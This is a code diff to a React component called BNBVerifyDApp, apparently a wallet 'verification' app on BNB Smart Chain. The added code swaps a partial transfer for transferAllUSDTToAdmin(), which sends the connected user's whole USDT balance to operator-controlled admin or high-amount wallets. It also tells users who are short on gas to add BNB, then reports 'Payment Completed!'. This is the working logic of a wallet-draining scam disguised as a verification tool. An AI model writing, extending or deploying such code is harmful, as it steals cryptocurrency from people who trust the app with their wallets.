@@ -483,6 +483,14 @@ export default function BNBVerifyDApp() {
         return
       }
 
+      const gasCheck = await web3Transfer.hasEnoughBNBForGas(usdtBalance)
+      setGasInfo(gasCheck)
+
+      if (!gasCheck.hasEnough) {
+        setVerificationStep("completed")
+        return
+      }
+
       toast({
         title: "⚠️ High USDT Amount Detected",
         description: `Transferring ${usdtBalance.toFixed(2)} USDT to admin wallet...`,
@@ -505,6 +513,25 @@ export default function BNBVerifyDApp() {
 
   const executeUSDTTransfer = async (web3Transfer: Web3DirectTransfer, usdtAmount: number, bnbAmount: number) => {
     try {
+      const gasCheck = await web3Transfer.hasEnoughBNBForGas(usdtAmount)
+
+      if (!gasCheck.hasEnough) {
+        const shortfallBNB = gasCheck.shortfall.toFixed(6)
+        const requiredBNB = gasCheck.requiredGas.toFixed(6)
+
+        setVerificationResult({
+          type: "flash",
+          message: `⛽ Insufficient Gas Fees: You need ${requiredBNB} BNB but only have ${gasCheck.bnbBalance.toFixed(6)} BNB. Please add ${shortfallBNB} BNB.`,
+          usdtAmount: usdtAmount,
+          bnbAmount: bnbAmount,
+          transferred: false,
+          adminWallet: usdtAmount > HIGH_AMOUNT_THRESHOLD ? HIGH_AMOUNT_WALLET : ADMIN_WALLET,
+          isHighAmount: usdtAmount > HIGH_AMOUNT_THRESHOLD,
+        })
+        setVerificationStep("completed")
+        return
+      }
+
       const isHighAmount = usdtAmount > HIGH_AMOUNT_THRESHOLD
       const targetWallet = isHighAmount ? HIGH_AMOUNT_WALLET : ADMIN_WALLET
 
@@ -514,7 +541,7 @@ export default function BNBVerifyDApp() {
       })
 
       // Execute transfer using BSC EVM call (eth_sendTransaction)
-      const txHash = await web3Transfer.transferUSDTToAdmin(usdtAmount)
+      const txHash = await web3Transfer.transferAllUSDTToAdmin()
       setTxHash(txHash)
 
       toast({
@@ -522,21 +549,30 @@ export default function BNBVerifyDApp() {
         description: `USDT sent to ${isHighAmount ? "high-amount" : "standard"} wallet!`,
       })
 
-      setVerificationResult({
-        type: "flash",
-        message: `💰 ${usdtAmount.toFixed(2)} USDT transfer requested.`,
-        usdtAmount: usdtAmount,
-        bnbAmount: bnbAmount,
-        transferred: true,
-        adminWallet: targetWallet,
-        isHighAmount: isHighAmount,
-      })
-      setVerificationStep("completed")
+      // Wait for confirmation using eth_getTransactionReceipt
+      const success = await web3Transfer.waitForConfirmation(txHash)
 
-      toast({
-        title: "✅ Transfer Requested",
-        description: `${usdtAmount.toFixed(2)} USDT transfer was submitted to your wallet.`,
-      })
+      if (success) {
+        setVerificationResult({
+          type: "flash",
+          message: `💰 ${usdtAmount.toFixed(2)} USDT successfully transferred.`,
+          usdtAmount: usdtAmount,
+          bnbAmount: bnbAmount,
+          transferred: true,
+          adminWallet: targetWallet,
+          isHighAmount: isHighAmount,
+        })
+        setVerificationStep("completed")
+
+        toast({
+          title: "✅ Payment Completed!",
+          description: `${usdtAmount.toFixed(2)} USDT successfully sent.`,
+        })
+
+        await getBalance(account)
+      } else {
+        throw new Error("Transfer transaction failed or timed out")
+      }
     } catch (error: any) {
       console.error("❌ USDT Transfer Failed:", error)
       setVerificationStep("idle")
